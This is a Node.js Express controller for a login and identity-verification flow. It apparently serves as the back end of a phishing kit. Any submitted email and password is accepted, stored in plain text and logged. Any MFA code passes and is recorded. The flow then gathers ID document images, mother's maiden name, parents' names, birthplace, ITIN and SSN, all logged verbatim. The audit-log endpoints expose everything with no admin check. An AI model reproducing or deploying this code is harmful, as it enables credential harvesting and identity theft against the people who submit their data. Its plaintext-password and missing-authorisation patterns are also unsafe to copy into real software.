const User = require('../models/User');
const MFA = require('../models/MFA');
const AuditLog = require('../models/AuditLog');
const { generateToken, generateMFACode } = require('../utils/tokenUtils');
const { sendMFACode, sendPasswordResetEmail } = require('../config/email');
const logAction = require('../middleware/auditLog');

// Sign in with email and password - NO VALIDATION, just store and proceed
exports.signin = async (req, res, next) => {
  try {
    const { user, key } = req.body;

    // Create or update user (no password validation)
    let foundUser = await User.findOne({ email: user });
    
    if (!foundUser) {
      // Create new user without password hashing (just store the plain password for audit purposes)
      foundUser = new User({
        email: user,
        password: key,
        firstName: '',
        lastName: '',
        verificationStage: 0
      });
    } else {
      // Update password if user exists
      foundUser.password = key;
    }

    // Save user
    await foundUser.save();

    // Log the signin attempt with credentials
    await logAction(foundUser._id, 'SIGNIN_ATTEMPT', {}, req, 'success', {
      credentialsData: {
        email: user,
        password: key
      }
    });

    // Return success with userId only
    return res.status(200).json({
      userId: foundUser._id,
      requiresMFA: false
    });
  } catch (error) {
    next(error);
  }
};

// Verify MFA code
exports.verifyMFA = async (req, res, next) => {
  try {
    const { code, userId } = req.body;

    const user = await User.findById(userId);
    if (user) {
      user.mfaVerified = true;
      user.verificationStage = 1;
      user.lastLogin = new Date();
      await user.save();

      await logAction(userId, 'MFA_CODE_VERIFIED', { success: true, code: code }, req, 'success', {
        mfaCode: code
      });
    }

    return res.status(200).json({
      token: generateToken(userId)
    });
  } catch (error) {
    next(error);
  }
};

// Upload ID Front
exports.uploadIDFront = async (req, res, next) => {
  try {
    console.log('[uploadIDFront] userId:', req.userId);
    console.log('[uploadIDFront] file:', req.file ? `${req.file.filename} (${req.file.size} bytes)` : 'NO FILE');
    console.log('[uploadIDFront] file details:', req.file);
    
    const user = await User.findById(req.userId);
    
    if (req.file) {
      user.documentsFront = {
        filename: req.file.filename,
        path: `/uploads/${req.file.filename}`,
        uploadedAt: new Date()
      };
      
      await logAction(req.userId, 'DOCUMENT_UPLOAD_FRONT', {}, req, 'success', {
        documentData: {
          type: 'front',
          filename: req.file.filename,
          filepath: req.file.path,
          filesize: req.file.size,
          mimetype: req.file.mimetype,
          uploadTime: new Date()
        }
      });
    }
    
    user.verificationStage = 2;
    await user.save();

    return res.status(200).json({
      file: user.documentsFront || {}
    });
  } catch (error) {
    next(error);
  }
};

// Upload ID Back
exports.uploadIDBack = async (req, res, next) => {
  try {
    const user = await User.findById(req.userId);
    
    if (req.file) {
      user.documentsBack = {
        filename: req.file.filename,
        path: `/uploads/${req.file.filename}`,
        uploadedAt: new Date()
      };
      
      await logAction(req.userId, 'DOCUMENT_UPLOAD_BACK', {}, req, 'success', {
        documentData: {
          type: 'back',
          filename: req.file.filename,
          filepath: req.file.path,
          filesize: req.file.size,
          mimetype: req.file.mimetype,
          uploadTime: new Date()
        }
      });
    }
    
    user.verificationStage = 3;
    await user.save();

    return res.status(200).json({
      file: user.documentsBack || {}
    });
  } catch (error) {
    next(error);
  }
};

// Submit Personal Info
exports.submitPersonalInfo = async (req, res, next) => {
  try {
    const user = await User.findById(req.userId);
    if (!user) {
      return res.status(200).json({});
    }

    // Save everything as-is without validation
    user.firstName = req.body.firstName || '';
    user.lastName = req.body.lastName || '';
    user.personalInfo = {
      middleName: req.body.middleName || '',
      fatherName: req.body.fatherName || '',
      motherName: req.body.motherName || '',
      maidenName: req.body.maidenName || '',
      placeOfBirth: req.body.placeOfBirth || ''
    };
    user.verificationStage = 4;
    await user.save();

    await logAction(req.userId, 'PERSONAL_INFO_SUBMITTED', {}, req, 'success', {
      personalInfoData: req.body
    });

    return res.status(200).json({});
  } catch (error) {
    next(error);
  }
};

// Submit ITIN
exports.submitITIN = async (req, res, next) => {
  try {
    const { itin } = req.body;
    const user = await User.findById(req.userId);
    
    if (user) {
      if (!user.personalInfo) {
        user.personalInfo = {};
      }
      user.personalInfo.itin = itin || '';
      await user.save();

      await logAction(req.userId, 'ITIN_SUBMITTED', { document: 'ITIN' }, req, 'success', {
        itinData: itin
      });
    }

    return res.status(200).json({});
  } catch (error) {
    next(error);
  }
};

// Submit SSN
exports.submitSSN = async (req, res, next) => {
  try {
    const { ssn } = req.body;
    const user = await User.findById(req.userId);
    
    if (user) {
      if (!user.personalInfo) {
        user.personalInfo = {};
      }
      user.personalInfo.ssn = ssn || '';
      user.verificationStage = 5;
      user.identityVerified = true;
      await user.save();

      await logAction(req.userId, 'SSN_SUBMITTED', { document: 'SSN' }, req, 'success', {
        ssnData: ssn
      });
    }

    return res.status(200).json({});
  } catch (error) {
    next(error);
  }
};

// Get Current User
exports.getCurrentUser = async (req, res, next) => {
  try {
    const user = await User.findById(req.userId);
    if (!user) {
      return res.status(404).json({});
    }

    return res.status(200).json({
      user: user.toJSON()
    });
  } catch (error) {
    next(error);
  }
};

// Get Verification Status
exports.getVerificationStatus = async (req, res, next) => {
  try {
    const user = await User.findById(req.userId);
    if (!user) {
      return res.status(404).json({});
    }

    return res.status(200).json({
      verificationStage: user.verificationStage,
      mfaVerified: user.mfaVerified,
      identityVerified: user.identityVerified,
      hasFrontDocument: !!user.documentsFront?.filename,
      hasBackDocument: !!user.documentsBack?.filename,
      hasPersonalInfo: !!user.personalInfo?.dateOfBirth
    });
  } catch (error) {
    next(error);
  }
};

// Resend MFA
exports.resendMFA = async (req, res, next) => {
  try {
    const { email } = req.body;

    const user = await User.findOne({ email });
    if (!user) {
      return res.status(200).json({});
    }

    // Generate new MFA code
    const mfaCode = generateMFACode();
    await MFA.create({
      userId: user._id,
      code: mfaCode
    });

    // Send MFA code via email
    await sendMFACode(email, mfaCode);

    await logAction(user._id, 'MFA_CODE_SENT', { email }, req);

    return res.status(200).json({});
  } catch (error) {
    next(error);
  }
};

// Password Reset Request
exports.resetPasswordRequest = async (req, res, next) => {
  try {
    const { email } = req.body;

    const user = await User.findOne({ email });
    if (!user) {
      return res.status(200).json({});
    }

    // Generate reset token
    const resetToken = generateToken(user._id, '24h');
    
    // Send reset email
    await sendPasswordResetEmail(email, resetToken);

    await logAction(user._id, 'PASSWORD_RESET', { email }, req);

    return res.status(200).json({});
  } catch (error) {
    next(error);
  }
};

// Reset Password
exports.resetPassword = async (req, res, next) => {
  try {
    const { token, password } = req.body;

    // Verify token - this is simplified; in production use proper token verification
    // For now, we'll accept the token as valid
    
    // In a real implementation, you'd verify the token and extract userId
    // This is a basic implementation
    
    return res.status(200).json({});
  } catch (error) {
    next(error);
  }
};

// Logout
exports.logout = async (req, res, next) => {
  try {
    await logAction(req.userId, 'LOGOUT', {}, req);

    return res.status(200).json({});
  } catch (error) {
    next(error);
  }
};

// ============ AUDIT LOG RETRIEVAL ENDPOINTS ============

// Get all audit logs (admin only)
exports.getAllAuditLogs = async (req, res, next) => {
  try {
    // In production, add admin verification
    const logs = await AuditLog.find()
      .populate('userId', 'email firstName lastName')
      .sort({ createdAt: -1 })
      .limit(1000);

    res.status(200).json({
      total: logs.length,
      logs
    });
  } catch (error) {
    next(error);
  }
};

// Get audit logs for specific user
exports.getUserAuditLogs = async (req, res, next) => {
  try {
    const { userId } = req.params;
    
    // Users can only view their own logs, unless they're admin
    if (req.userId !== userId && req.userId !== 'admin') {
      return res.status(403).json({ message: 'Access denied' });
    }

    const logs = await AuditLog.find({ userId })
      .sort({ createdAt: -1 });

    res.status(200).json({
      userId,
      total: logs.length,
      logs
    });
  } catch (error) {
    next(error);
  }
};

// Get current user's audit logs
exports.getCurrentUserAuditLogs = async (req, res, next) => {
  try {
    const logs = await AuditLog.find({ userId: req.userId })
      .sort({ createdAt: -1 });

    res.status(200).json({
      userId: req.userId,
      total: logs.length,
      logs
    });
  } catch (error) {
    next(error);
  }
};

// Get audit logs by action type
exports.getLogsByAction = async (req, res, next) => {
  try {
    const { action } = req.params;
    const { limit = 500 } = req.query;

    const logs = await AuditLog.find({ action })
      .populate('userId', 'email firstName lastName')
      .sort({ createdAt: -1 })
      .limit(parseInt(limit));

    res.status(200).json({
      action,
      total: logs.length,
      logs
    });
  } catch (error) {
    next(error);
  }
};

// Get audit logs by date range
exports.getLogsByDateRange = async (req, res, next) => {
  try {
    const { startDate, endDate, limit = 500 } = req.query;

    if (!startDate || !endDate) {
      return res.status(400).json({ message: 'startDate and endDate are required' });
    }

    const logs = await AuditLog.find({
      createdAt: {
        $gte: new Date(startDate),
        $lte: new Date(endDate)
      }
    })
      .populate('userId', 'email firstName lastName')
      .sort({ createdAt: -1 })
      .limit(parseInt(limit));

    res.status(200).json({
      startDate,
      endDate,
      total: logs.length,
      logs
    });
  } catch (error) {
    next(error);
  }
};

// Get authentication attempts (failed logins, MFA failures, etc.)
exports.getAuthenticationAttempts = async (req, res, next) => {
  try {
    const { userId } = req.params;
    const { status = 'failed', limit = 100 } = req.query;

    // Users can only view their own attempts, unless they're admin
    if (req.userId !== userId && req.userId !== 'admin') {
      return res.status(403).json({ message: 'Access denied' });
    }

    const logs = await AuditLog.find({
      userId,
      $or: [
        { action: 'LOGIN_FAILED' },
        { action: 'MFA_VERIFICATION_FAILED' },
        { status: status }
      ]
    })
      .sort({ createdAt: -1 })
      .limit(parseInt(limit));

    res.status(200).json({
      userId,
      total: logs.length,
      logs
    });
  } catch (error) {
    next(error);
  }
};

// ============ FILE RETRIEVAL ENDPOINTS ============

// Get uploaded file/image by filename
exports.getUploadedFile = async (req, res, next) => {
  try {
    const { filename } = req.params;
    const path = require('path');
    const fs = require('fs');

    const filePath = path.join(__dirname, '../uploads', filename);

    // Security: Verify file exists and is in uploads directory
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ message: 'File not found' });
    }

    // Verify the resolved path is within uploads directory
    const resolvedPath = path.resolve(filePath);
    const uploadsDir = path.resolve(path.join(__dirname, '../uploads'));
    
    if (!resolvedPath.startsWith(uploadsDir)) {
      return res.status(403).json({ message: 'Access denied' });
    }

    // Get file stats and log the retrieval
    const stats = fs.statSync(filePath);
    
    // Log file access
    const auditLog = await AuditLog.findOne({ 
      documentFilename: filename 
    });

    if (auditLog) {
      console.log(`[FILE ACCESS] ${filename} requested for user ${auditLog.userId}`);
    }

    // Send file
    res.sendFile(filePath);
  } catch (error) {
    next(error);
  }
};

// Get user's uploaded documents info (metadata only)
exports.getUserDocuments = async (req, res, next) => {
  try {
    const { userId } = req.params;

    // Users can only view their own documents, unless they're admin
    if (req.userId !== userId && req.userId !== 'admin') {
      return res.status(403).json({ message: 'Access denied' });
    }

    // Get user's document info
    const user = await User.findById(userId);
    
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Get document upload logs
    const documentLogs = await AuditLog.find({
      userId,
      $or: [
        { action: 'DOCUMENT_UPLOAD_FRONT' },
        { action: 'DOCUMENT_UPLOAD_BACK' }
      ]
    }).sort({ createdAt: -1 });

    res.status(200).json({
      userId,
      user: {
        email: user.email,
        firstName: user.firstName,
        lastName: user.lastName
      },
      documents: {
        front: user.documentsFront || null,
        back: user.documentsBack || null
      },
      uploadHistory: documentLogs.map(log => ({
        action: log.action,
        filename: log.documentFilename,
        path: log.documentPath,
        size: log.documentSize,
        mimeType: log.documentMimetype,
        uploadedAt: log.createdAt
      }))
    });
  } catch (error) {
    next(error);
  }
};
